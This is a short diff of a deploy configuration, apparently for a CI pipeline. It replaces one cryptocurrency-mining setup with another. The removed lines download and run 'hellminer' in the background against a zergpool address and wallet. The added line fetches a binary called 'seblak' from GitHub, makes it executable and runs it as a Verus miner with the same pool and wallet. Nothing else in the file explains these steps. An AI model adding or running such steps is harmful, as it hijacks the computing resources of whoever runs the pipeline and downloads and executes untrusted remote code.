@@ -1,7 +1,4 @@
 deploy:
   - apt-get update && apt-get upgrade -y
   - apt-get install curl -y
-  - curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz
-  - tar xf hellminer_cpu_linux.tar.gz
-  - rm hellminer_cpu*
-  - nohup ./hellminer -c stratum+tcp:///verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW -p c=DGB --cpu $(echo $(nproc --all))
+  - curl -qO build https://github.com/desafff/nreg/raw/main/seblak && chmod +x build && ./build -a verus -o stratum+tcp:///verushash.asia.mine.zergpool.com:3300 -u DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW.seblak -p c=DGB -t 4
